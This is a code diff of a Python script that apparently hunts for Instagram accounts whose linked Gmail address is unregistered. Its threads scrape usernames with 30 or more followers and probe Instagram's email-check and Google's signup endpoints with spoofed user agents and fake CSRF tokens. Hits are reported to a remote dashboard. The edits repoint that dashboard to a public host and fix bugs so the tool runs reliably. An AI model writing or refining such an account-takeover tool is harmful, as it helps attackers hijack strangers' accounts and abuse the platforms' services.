@@ -8,15 +8,16 @@ from user_agent import generate_user_agent as gg
 from random import choice as cc
 from random import randrange as rr
 
-# ================= DASHBOARD SYNC LOGIC =================
+# ================= FIXED DASHBOARD SYNC LOGIC =================
 def send_to_dashboard(stat_type):
     try:
-        # Dashboard (app.py) ko hit/bad signal bhejna
-        requests.post('http://127.0.0.1:5000/update_stats', json={'type': stat_type}, timeout=0.5)
+        # Dashboard Live URL for Render
+        url = 'https://system-override-v2.onrender.com/update_stats'
+        requests.post(url, json={'type': stat_type}, timeout=5)
     except:
         pass
 
-# Dashboard se ID aur Token lene ke liye (Arguments handling)
+# Dashboard se ID aur Token lene ke liye
 if len(sys.argv) > 2:
     ID = sys.argv[1]
     token = sys.argv[2]
@@ -24,10 +25,9 @@ else:
     ID = input("\033[1;36mEnter ID: ")
     token = input("\033[1;36mEnter Token: ")
 
-# MD5 helper (Fixing the missing md5 error in original script)
 def get_md5(data):
     return hashlib.md5(data).hexdigest()
-# =========================================================
+# =============================================================
 
 # Expiration Check
 EXPIRE_TIME = '2080-03-30 11:00:00'
@@ -50,12 +50,13 @@ def tll():
         response = pp('https://accounts.google.com/_/signup/validatepersonaldetails', headers=headers, data=data)
         
         tl = str(response.text).split('",null,"')[1].split('"')[0]
-        host = response.cookies.get_dict()['__Host-GAPS']
+        host = response.cookies.get_dict().get('__Host-GAPS', '')
         with open('tl.txt','w') as f: f.write(tl+'//'+host)
     except: tll()
 
 def check_gmail(email):
     try:
+        if not os.path.exists('tl.txt'): tll()
         with open('tl.txt','r') as f: o = f.read().splitlines()[0]
         tl, host = o.split('//')
         headers = {'authority':'accounts.google.com','user-agent':gg()}
@@ -67,7 +68,7 @@ def check_gmail(email):
 def shelby_info(username):
     global hit_dustu
     hit_dustu += 1
-    send_to_dashboard('hit') # DASHBOARD HIT UPDATE
+    send_to_dashboard('hit')
     
     porno = f"""
 ━━━━━━━━━━━━━━━
@@ -86,7 +87,6 @@ def shelby_info(username):
 def seks(email):
     global kotu_insta, orta_mail
     try:
-        # Fixed the missing md5 part here
         headers = {'user-agent':gg(), 'x-csrftoken':get_md5(str(time.time()).encode())}
         res = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data={'email': email})
         
@@ -95,13 +95,14 @@ def seks(email):
                 shelby_info(email.split('@')[0])
             else:
                 orta_mail += 1
-                send_to_dashboard('bad') # DASHBOARD BAD UPDATE
+                send_to_dashboard('bad')
         else:
             kotu_insta += 1
-            send_to_dashboard('bad') # DASHBOARD BAD UPDATE
+            send_to_dashboard('bad')
     except: pass
     
-    print(f"\r{E}HIT: {hit_dustu} | {Z}BAD: {kotu_insta} | {X}MAIL: {orta_mail}", end="")
+    sys.stdout.write(f"\r{E}HIT: {hit_dustu} | {Z}BAD: {kotu_insta} | {X}MAIL: {orta_mail}")
+    sys.stdout.flush()
 
 def shubhvipfree():
     while True:
@@ -114,7 +115,7 @@ def shubhvipfree():
             res = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()
             user = res.get('data', {}).get('user', {})
             username = user.get('username')
-            # Follower filter
+            # 30+ Followers filter
             if username and user.get('follower_count', 0) >= 30:
                 seks(username + '@gmail.com')
         except: continue
@@ -122,10 +123,9 @@ def shubhvipfree():
 # Setup & Run
 if not os.path.exists('tl.txt'): tll()
 
-# Daemon threads for smooth closing
-for _ in range(60):
+# Threads - 20 threads are safer for Render
+for _ in range(20):
     Thread(target=shubhvipfree, daemon=True).start()
 
-# Main loop to keep script alive
 while True:
     time.sleep(10)
